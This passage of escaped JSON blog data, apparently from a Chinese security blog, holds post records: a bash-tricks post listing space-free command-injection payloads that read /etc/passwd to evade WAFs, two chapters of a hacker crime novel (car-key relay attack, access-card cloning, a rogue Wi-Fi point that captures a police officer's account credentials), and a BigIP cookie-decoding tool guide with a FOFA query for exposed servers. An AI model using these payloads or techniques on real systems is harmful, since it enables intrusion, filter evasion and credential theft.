：无空格命令执行&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bash&#34;,&#34;slug&#34;:&#34;qQe11RUE5qU&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qQe11RUE5qU/&#34;},{&#34;name&#34;:&#34;tricks&#34;,&#34;slug&#34;:&#34;ofwPzgsOAbl&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ofwPzgsOAbl/&#34;},{&#34;name&#34;:&#34;execute&#34;,&#34;slug&#34;:&#34;XzMqP0zvw76&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/XzMqP0zvw76/&#34;},{&#34;name&#34;:&#34;commands&#34;,&#34;slug&#34;:&#34;RLfaPsOPpsZ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/RLfaPsOPpsZ/&#34;},{&#34;name&#34;:&#34;command&#34;,&#34;slug&#34;:&#34;6rt6mf--n-e&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/6rt6mf--n-e/&#34;}],&#34;date&#34;:&#34;2020-03-22 12:19:12&#34;,&#34;dateFormat&#34;:&#34;2020-03-22&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/bashtricks-execute-commands-without-space/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:36000,&#34;words&#34;:135,&#34;minutes&#34;:1},&#34;description&#34;:&#34;在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：\nIFS=,;`cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd` \ncat$IFS/etc/passwd \ncat${IFS}/etc/passw...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;strong&gt;我不相信造化弄人。世界上出类拔萃的人，都主动找寻他们想要的环境。要是遍寻不获,他们就创造一个。 ——萧伯纳&lt;/strong&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;王梓家中\&#34;&gt;王梓家中&lt;/h2&gt;\n&lt;p&gt;结果往往在一个人做选择的时候就已经注定。危险正在一点一点向王梓靠近。买家提出的线下交易，对于网络杀手走入现实，那么就以为着自杀。羸弱的王梓，能打得过谁呢。除此之外，还很有可能就像阿桑奇被捕时的样子。那一副银白色手镯想想都觉得冰冷。王梓不禁打了一个冷颤。&lt;/p&gt;\n&lt;p&gt;当下，王梓没有太多的时间想这些，他必须要走下去。就算没有出路，那么也要走出一条自己的路。&lt;/p&gt;\n&lt;p&gt;普通的夜晚，大多数人已进入梦乡。王梓在电脑前敲击着键盘，眼镜上可以看到映射出的一行行代码，电脑的usb口上连接着一台树莓派上。此时编写的程序就是即将在这台微型电脑上运行的。流动的代码仿佛在与时间赛跑，慢一步就可能被超过而崩溃。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584374892509.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;不知不觉，清晨的朝阳照亮了阳台，温暖而不炙热。随着最后一次回车键按响，程序也可以正常运行起来。就要离开这里了，收起桌上的两台笔记本电脑、U盘、望远镜、还有插在电脑上的树莓派装到背包里。将手机放到了微波炉里，并放在了电脑旁。王梓走出房子，电脑正常运行着。&lt;/p&gt;\n&lt;p&gt;站在天台上，阳光照射全身，一股暖意袭遍王梓的全身。好难得的时光。可惜，马上就要走了。王梓找了快隐蔽的可以放进树莓派的地方，把树莓派放好，然后把太阳能天池板放到外面。可以为树莓派续航。&lt;/p&gt;\n&lt;p&gt;王梓拿起了一部新手机，拨通了小楠的电话。响了三声，电话接通了。传来了带有起床气的一声喂，哪位？。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;“早上好啊～，我王梓。”。&lt;br&gt;\n“这么早，你干什么呀？”&lt;br&gt;\n“我就要离开这里了，一会的飞机，打电话跟你道个别。”&lt;br&gt;\n“道别？你要去哪里啊？怎么也不提前打个招呼，怎么也要当面道别啊。”&lt;br&gt;\n“我…… 我怕没有当面没有道别的勇气”&lt;br&gt;\n“你呀，怎么说你好呢。那你要群里，以后有机会了，去找你玩啊。”&lt;br&gt;\n“好，等我到了地方，发地址给你。你要记得按时吃早餐，注意身体。”&lt;br&gt;\n“好～～”&lt;br&gt;\n“记得，你欠我一顿饭了哦～千万不要忘记了哦”&lt;br&gt;\n“嘿嘿～，忘不了。你接着睡吧。”&lt;br&gt;\n“拜拜”&lt;br&gt;\n“再见”&lt;/p&gt;\n&lt;p&gt;小楠那边挂了电话，王梓说了一句：“后会无期”。脑海里浮现了那几句歌词：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;当一艘船沉入海底，当一个人成了谜\n你不知道，他们为何离去\n那声再见竟是他最后一句\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;旅游大把候车点\&#34;&gt;旅游大把候车点&lt;/h2&gt;\n&lt;p&gt;北京的早高峰即将到来，此刻，十几个人正在排队登上去往八达岭的旅游客车。王梓就在其中。王梓上车后，使用国外的网络电话给买家发了一条消息，两个小时后，八达岭长城景区景点见。一晚没睡，显得有些疲惫，可以趁车上的时间睡一会儿。&lt;/p&gt;\n&lt;p&gt;到达地点后，王梓观察了下周围的环境。并寻找到了一处地点发给了对方，他则找了远处的一个地方，手持望远镜，等待这目标出现。约定的时间马上就要到了，有一个身穿牛仔裤，黑色夹克衫的中年男子出现了王梓视线内。王梓拨通了电话，那名男子拿起电话。确认了就是这个人。&lt;br&gt;\n电话那头说：“我已经到了，你在哪里。”&lt;br&gt;\n“进入景区，你找一个穿红色里面穿红色卫衣，头戴红色帽子，手拿红色导游旗子的就是我了。”&lt;br&gt;\n“好，等我。”&lt;/p&gt;\n&lt;p&gt;王梓观察这那名男子一举一动，王梓观察到周围有几个人也一直在跟着那个人。不久，他找到了王梓说的人，然后不知怎么起了一些争执，就要动手。此人看上去练过的样子。王梓觉得事情不好。关掉手机，往停车场走去。那个人自然联系不到王梓，他们只好给王梓留言。而王梓也开始了自己的逃亡之路。&lt;/p&gt;\n&lt;p&gt;王梓家中来了警察，他们在门口按了几下门铃，等了一会，见没人应。便强制进入到王梓家中。进门的那一刻，一名警察似乎脚下被门口的什么东西拌了一下，接着传来清脆的风铃声。这时王梓的电脑主机开始运转速度加快，声音也随之变大。电脑中加密的内容开始被擦除。此时的王梓通过控制树莓派观看家里的影响和声音，他拍下了几个人的照片，然后按下了自毁按键。王梓家中电脑桌上的微波炉开始工作，警察们还在检查着屋子，就在即将来到电脑来来进行取证的时候。电脑桌上的微波炉爆炸了，还有火花，紧接着又爆炸一次。因为电脑就在微波炉旁边，电脑已经停止运转，而受爆炸影响，电脑的主板，硬盘等都已经损坏。而王梓家里的电也因为爆炸而跳闸。房间里静下来，爆炸的位置冒着烟。现在警察已经无法取证。只能继续排查房间，他们不知道的是，在检查房间的时候，一个警察的手机已经自动连接上了王梓伪造的wiki上。这个是通过在树莓派上搭建的FruityWifi（注解1）实现。王梓获取了这名警察的qq号码，和一个账号密码。并迅速擦除了树莓派上所有的记录。&lt;/p&gt;\n&lt;p&gt;警察没有其他收获，最终仅仅带走了那个网络摄像头和已经损坏的电脑。&lt;/p&gt;\n&lt;p&gt;王梓要冒险继续深入调查买家。他要了解清楚这一整件事。双方都在寻找王梓，但是一时间，王梓就如同人间蒸发，没有了踪迹。消息在网络中，隐藏在这现实世界中。&lt;/p&gt;\n&lt;h2 id=\&#34;注解\&#34;&gt;注解&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;注解1: FruityWIfi是一款无线安全审计的开源工具，其灵感来自于Wifi Pineapple。开源地址：https://github.com/xtr4nge/FruityWifi 感兴趣的，可以搜索Wifi Pineapple和FruityWIfi去学习。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Ten&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;&lt;strong&gt;我不相信造化弄人。世界上出类拔萃的人，都主动找寻他们想要的环境。要是遍寻不获,他们就创造一个。 ——萧伯纳&lt;/strong&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;王梓家中\&#34;&gt;王梓家中&lt;/h2&gt;\n&lt;p&gt;结果往往在一个人做选择的时候就已经注定。危险正在一点一点向王梓靠近。买家提出的线下交易，对于网络杀手走入现实，那么就以为着自杀。羸弱的王梓，能打得过谁呢。除此之外，还很有可能就像阿桑奇被捕时的样子。那一副银白色手镯想想都觉得冰冷。王梓不禁打了一个冷颤。&lt;/p&gt;\n&lt;p&gt;当下，王梓没有太多的时间想这些，他必须要走下去。就算没有出路，那么也要走出一条自己的路。&lt;/p&gt;\n&lt;p&gt;普通的夜晚，大多数人已进入梦乡。王梓在电脑前敲击着键盘，眼镜上可以看到映射出的一行行代码，电脑的usb口上连接着一台树莓派上。此时编写的程序就是即将在这台微型电脑上运行的。流动的代码仿佛在与时间赛跑，慢一步就可能被超过而崩溃。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584374892509.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;不知不觉，清晨的朝阳照亮了阳台，温暖而不炙热。随着最后一次回车键按响，程序也可以正常运行起来。就要离开这里了，收起桌上的两台笔记本电脑、U盘、望远镜、还有插在电脑上的树莓派装到背包里。将手机放到了微波炉里，并放在了电脑旁。王梓走出房子，电脑正常运行着。&lt;/p&gt;\n&lt;p&gt;站在天台上，阳光照射全身，一股暖意袭遍王梓的全身。好难得的时光。可惜，马上就要走了。王梓找了快隐蔽的可以放进树莓派的地方，把树莓派放好，然后把太阳能天池板放到外面。可以为树莓派续航。&lt;/p&gt;\n&lt;p&gt;王梓拿起了一部新手机，拨通了小楠的电话。响了三声，电话接通了。传来了带有起床气的一声喂，哪位？。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第十章 逃&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;树莓派&#34;,&#34;slug&#34;:&#34;ZUTWXSXxrTz&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ZUTWXSXxrTz/&#34;},{&#34;name&#34;:&#34;FruityWIfi&#34;,&#34;slug&#34;:&#34;-zNCfTEWpnX&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-zNCfTEWpnX/&#34;}],&#34;date&#34;:&#34;2020-03-21 18:38:28&#34;,&#34;dateFormat&#34;:&#34;2020-03-21&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Ten.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Ten/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;6 min read&#34;,&#34;time&#34;:343000,&#34;words&#34;:1702,&#34;minutes&#34;:6},&#34;description&#34;:&#34;我不相信造化弄人。世界上出类拔萃的人，都主动找寻他们想要的环境。要是遍寻不获,他们就创造一个。 ——萧伯纳\n王梓家中\n结果往往在一个人做选择的时候就已经注定。危险正在一点一点向王梓靠近。买家提出的线下交易，对于网络杀手走入现实，那么就以为着...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%8E%8B%E6%A2%93%E5%AE%B6%E4%B8%AD\&#34;&gt;王梓家中&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%97%85%E6%B8%B8%E5%A4%A7%E6%8A%8A%E5%80%99%E8%BD%A6%E7%82%B9\&#34;&gt;旅游大把候车点&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B3%A8%E8%A7%A3\&#34;&gt;注解&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer&lt;sub&gt;FinanceAndAdminWeb&lt;/sub&gt;fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。&lt;/p&gt;\n&lt;p&gt;最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语言编写，支持4种cookie格式。github地址：&lt;a href=\&#34;https://github.com/Orange-Cyberdefense/rabid\&#34;&gt;https://github.com/Orange-Cyberdefense/rabid&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;工具使用\&#34;&gt;工具使用&lt;/h2&gt;\n&lt;p&gt;工具使用ruby编写，需要ruby 2.4以上版本的环境。首先要保证安装好ruby。然后使用gem安装包&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;gem install rabid&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;安装完成后，可以使用ruby包含该库，也可以直接运行命令执行。&lt;/p&gt;\n&lt;p&gt;命令示例如下：&lt;br&gt;\n&lt;code&gt;rabid &#39;BIGipServer~FinanceAndAdminWeb~fo.unc.edu=105389996.20480.0000&#39;&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;上面的参数就是set-cookie的值。&lt;/p&gt;\n&lt;p&gt;运行结果(运行环境macos，ruby 2.6.3)：&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584775312957.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在自己的代码中使用该库,代码示例如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;require &#39;bigipcookie&#39;\n\n# IPv4 pool members, with pool name\nbip = BigIPCookie::Decode.new(&#39;BIGipServer&amp;lt;pool_name&amp;gt;=1677787402.36895.0000&#39;)\n# Automatically decode\nbip.auto_decode\n# Print result\nputs &amp;quot;Cookie: #{bip.decoded_cookie}&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;另外也可以使用git安装。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;git clone https://github.com/Orange-Cyberdefense/rabid.git rabid\ncd rabid\ngem install bundler\nbundler install\ngem build bigipcookie.gemspec\ngem install rabid-x.x.x.gem\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;具体帮助文档可见：https://orange-cyberdefense.github.io/rabid/&lt;/p&gt;\n&lt;h2 id=\&#34;测试\&#34;&gt;测试&lt;/h2&gt;\n&lt;p&gt;使用fofa可搜索到上万个例子，搜索语法：&lt;code&gt;header=&amp;quot;BIGipServer&amp;quot;&lt;/code&gt;。链接地址：&lt;a href=\&#34;https://fofa.so/result?qbase64=aGVhZGVyPSJCSUdpcFNlcnZlciI%3D\&#34;&gt;https://fofa.so/result?qbase64=aGVhZGVyPSJCSUdpcFNlcnZlciI%3D&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;bigip-cookie-decode-get-real-ip&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer&lt;sub&gt;FinanceAndAdminWeb&lt;/sub&gt;fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。&lt;/p&gt;\n&lt;p&gt;最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语言编写，支持4种cookie格式。github地址：&lt;a href=\&#34;https://github.com/Orange-Cyberdefense/rabid\&#34;&gt;https://github.com/Orange-Cyberdefense/rabid&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;工具使用\&#34;&gt;工具使用&lt;/h2&gt;\n&lt;p&gt;工具使用ruby编写，需要ruby 2.4以上版本的环境。首先要保证安装好ruby。然后使用gem安装包&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;gem install rabid&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;安装完成后，可以使用ruby包含该库，也可以直接运行命令执行。&lt;/p&gt;\n&lt;p&gt;命令示例如下：&lt;br&gt;\n&lt;code&gt;rabid &#39;BIGipServer~FinanceAndAdminWeb~fo.unc.edu=105389996.20480.0000&#39;&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;上面的参数就是set-cookie的值。&lt;/p&gt;\n&lt;p&gt;运行结果(运行环境macos，ruby 2.6.3)：&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;BigIP Cookie 解码获取真实IP&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;decode&#34;,&#34;slug&#34;:&#34;_gyskx7-lzv&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/_gyskx7-lzv/&#34;},{&#34;name&#34;:&#34;bigip&#34;,&#34;slug&#34;:&#34;9kUyXCYfrSG&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/9kUyXCYfrSG/&#34;},{&#34;name&#34;:&#34;cookie&#34;,&#34;slug&#34;:&#34;D8r3IlHeMLc&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/D8r3IlHeMLc/&#34;},{&#34;name&#34;:&#34;ip&#34;,&#34;slug&#34;:&#34;1XSQUgSqq3b&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1XSQUgSqq3b/&#34;}],&#34;date&#34;:&#34;2020-03-21 15:02:57&#34;,&#34;dateFormat&#34;:&#34;2020-03-21&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/bigip-cookie-decode-get-real-ip/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:104000,&#34;words&#34;:403,&#34;minutes&#34;:2},&#34;description&#34;:&#34;BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8\&#34;&gt;工具使用&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B5%8B%E8%AF%95\&#34;&gt;测试&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;##芭堤雅&lt;/p&gt;\n&lt;p&gt;下午两点，一架直升机停在4000米的高空中，王梓手握着飞机舱门上的把手，耳边是螺旋桨旋转发出的轰隆声，身体下方的是距离4000米高的海岸。背后的老外对他喊的话，他已经听不清楚。撒开手，他与身后的老外一起跳下飞机。突然间，王梓大脑一片空白，心感觉也要从嗓子眼中蹦出去，但很快他感觉到的是身体极速下坠的失重感。王梓闭上了眼睛，脑海中浮现出他拿到的那份资料，文件里一个个名字，以及记录的时间和地点，让他产生了恐惧，这次他犹豫了，不知道是否要继续下去。过了几秒，他身后的老外打开了什么东西，双腿突然向被甩出去一样，降落的速度慢了一些。但是，下降的速度还是会形成很大的气流，吹的他脸部、胳膊都变形了。他睁开了眼睛，阳光照射下的海洋、沙滩、树木、草地尽收眼底。王梓想：“这就是上帝视角吧”。这种居高临下的感觉，是前所未有的，那种强者才有的孤独感更加的强烈。&lt;/p&gt;\n&lt;p&gt;男人的天堂——芭堤雅。夜晚降临，这座城市才真正的迎来高潮。你所看到大街上的美女不一定是个女人。倘若你走上路上，坐在按摩店门口的泰国中年女子拉着你的手叫你老公或者老板。也会看到欧美中年肥胖男子手里搂着他们买来的泰国老婆。当然，街上的中国人也不少。近些年来大陆来东南亚的游客越拉越多。王梓坐在酒吧的一个角落里，独自一人喝着酒。他还在犹豫。桌上的酒已经喝的差不多了，他看着手中的酒杯。然后猛地的一口将杯中酒全部喝完。轻轻的放下酒杯，起身走出酒吧，他已经做出了决定了。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h2 id=\&#34;北京\&#34;&gt;北京&lt;/h2&gt;\n&lt;p&gt;killer47 ：“目标已经搞定，可以开始交易了。”&lt;br&gt;\nBoss ： “不愧是killer47先生，比规定时间早了一个月就搞定了。我们当面交易如何？”&lt;br&gt;\nkiller47 ：“这是不可能的。不要试图调查我。你不会有任何结果。”&lt;br&gt;\nBoss ： “别误会，这资料非常重要，我们需要当面确认，防止你逃跑。”&lt;br&gt;\nkiller47 ： “我怎么可以信任你们？”&lt;br&gt;\nBoss : “交易地点和时间可以你来选，同时我们可以先把一半的佣金先付给你。如何？”&lt;br&gt;\nkiller47 ：“你们等我消息吧。”&lt;br&gt;\nBoos ： “静候佳音”。&lt;br&gt;\n这次王梓已经决定冒险。他将获取到的重要的音频，图片和excel文档使用truecrypt进行加密，接着又将加密的内容文件通过隐写（备注1）软件隐藏在不同的图片中。然后拷贝到一个usb中。这些文件存储着HH集团老板与某些官员的犯罪证据，以及账目信息。有照片，有录音，还有通讯录。这原本存放在HH集团老板的私人电脑中。王梓冒着极大的风险获取到了它，但是此时事情应该已经暴露。前不久，他的朋友石磊突然联系他，并询问他为什么要去偷盗，同时已经有经常开始介入了，并劝他尽快自守。对于这一切，王梓现在还不能跟他的好友说明这一切，他不得不告诉他的好友后面解释。并挂断了电话。&lt;/p&gt;\n&lt;p&gt;这还要从王梓在IT部门的人员获取权限后说起，他寻找到秘书所使用的电脑。了解到了HH集团老板的部分行程。王梓开车提前到地点守在门口并进行跟踪。这个过程非常需要耐心，需要守株待兔，盯着目标人物。王梓跟到了HH集团老板的住处，并对其周围进行观察，是在顺义区的一个别墅区。别墅区管理严格，王梓无法直接跟进去。王梓观察了下别墅以及周边的情况。接下来又是漫长又无聊的等待，等待着目标人物再次出现。期间一直没有机会去进一步接触，直到晚上HH集团去约人吃饭。在吃完饭后，HH集团老板开车的一瞬间，王梓在不远处进行中继攻击，最终王梓可以解锁HH老板的车（备注2）。王梓又继续等待时机，趁机使用Nexus手机（备注3）复制其放在车内的小区门禁卡。通过王梓的几天来的蹲点，进入到HH集团老板的家中，并将其私人电脑中的硬盘克隆出一份。这还不是最后一步，他将网线接入自己的电脑中。开始探测这栋房子里的摄像头，他要删掉摄像头的关于他的影像。出回到家中，王梓仔细分析其内容，终于找到了需要的文件。当他看到文件的那一刻，不禁吃了一惊。这是他惹不起的，这也就是他一直犹豫的原因。而事情已经做了，暴露只是时间问题。王梓的行为已经被小区监控记录下。小区的监控短时间发现并将他的记录删除这并不容易。&lt;/p&gt;\n&lt;p&gt;王梓要尽快的拿到钱，并尽快离开这里。想想就要离开小楠，王梓有些不舍，但是他不得不离开，迈出了这一步，他已经没有了选择。&lt;/p&gt;\n&lt;p&gt;##注解&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;数据隐写：一种将信息隐藏在正常文件（如jpg、bmp、gif、mp3、pdf等）中的技术。工具有很多，如LSB-Steganography，mp3stego、stegomagic等。也可以利用ntfs文件格式的ads流来实现。一些ctf比赛中的misc会有。感兴趣的可以进一步了解一下。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;黑客可以克隆丰田、现代等汽车：原文：https://www.wired.com/story/hackers-can-clone-millions-of-toyota-hyundai-kia-keys/ 。这里提到的中继攻击是去年破解特斯拉使用的攻击方法。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Google Nexus 6：刷kali nethunter后，可以对其读写rfid卡。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Nine&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;##芭堤雅&lt;/p&gt;\n&lt;p&gt;下午两点，一架直升机停在4000米的高空中，王梓手握着飞机舱门上的把手，耳边是螺旋桨旋转发出的轰隆声，身体下方的是距离4000米高的海岸。背后的老外对他喊的话，他已经听不清楚。撒开手，他与身后的老外一起跳下飞机。突然间，王梓大脑一片空白，心感觉也要从嗓子眼中蹦出去，但很快他感觉到的是身体极速下坠的失重感。王梓闭上了眼睛，脑海中浮现出他拿到的那份资料，文件里一个个名字，以及记录的时间和地点，让他产生了恐惧，这次他犹豫了，不知道是否要继续下去。过了几秒，他身后的老外打开了什么东西，双腿突然向被甩出去一样，降落的速度慢了一些。但是，下降的速度还是会形成很大的气流，吹的他脸部、胳膊都变形了。他睁开了眼睛，阳光照射下的海洋、沙滩、树木、草地尽收眼底。王梓想：“这就是上帝视角吧”。这种居高临下的感觉，是前所未有的，那种强者才有的孤独感更加的强烈。&lt;/p&gt;\n&lt;p&gt;男人的天堂——芭堤雅。夜晚降临，这座城市才真正的迎来高潮。你所看到大街上的美女不一定是个女人。倘若你走上路上，坐在按摩店门口的泰国中年女子拉着你的手叫你老公或者老板。也会看到欧美中年肥胖男子手里搂着他们买来的泰国老婆。当然，街上的中国人也不少。近些年来大陆来东南亚的游客越拉越多。王梓坐在酒吧的一个角落里，独自一人喝着酒。他还在犹豫。桌上的酒已经喝的差不多了，他看着手中的酒杯。然后猛地的一口将杯中酒全部喝完。轻轻的放下酒杯，起身走出酒吧，他已经做出了决定了。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第九章 王者归来&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;google&#34;,&#34;slug&#34;:&#34;dhbhlfI0Is4&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/dhbhlfI0Is4/&#34;},{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;数据隐写&#34;,&#34;slug&#34;:&#34;zHjnAc4vzlH&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/zHjnAc4vzlH/&#34;},{&#34;name&#34;:&#34;nexus6&#34;,&#34;slug&#34;:&#34;awfop0eFXeg&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/awfop0eFXeg/&#34;}],&#34;date&#34;:&#34;2020-03-21 14:48:23&#34;,&#34;dateFormat&#34;:&#34;2020-03-21&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Nine/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;6 min read&#34;,&#34;time&#34;:328000,&#34;words&#34;:1593,&#34;minutes&#34;:6},&#34;description&#34;:&#34;##芭堤雅\n下午两点，一架直升机停在4000米的高空中，王梓手握着飞机舱门上的把手，耳边是螺旋桨旋转发出的轰隆声，身体下方的是距离4000米高的海岸。背后的老外对他喊的话，他已经听不清楚。撒开手，他与身后的老外一起跳下飞机。突然间，王梓大脑...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8C%97%E4%BA%AC\&#34;&gt;北京&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;pre&gt;&lt;code&gt;这是一个最好的时代，这是一个最坏的时代；\n\n这是一个智慧的年代，这是一个愚蠢的年代；\n\n这是一个光明的季节，这是一个黑暗的季节；\n\n这是希望之春，这是失望之冬；\n\n人们面前应有尽有，人们面前一无所有；\n\n人们正踏上天堂之路，人们正走向地狱之门。\n\n　　                        ——《双城记》狄更斯 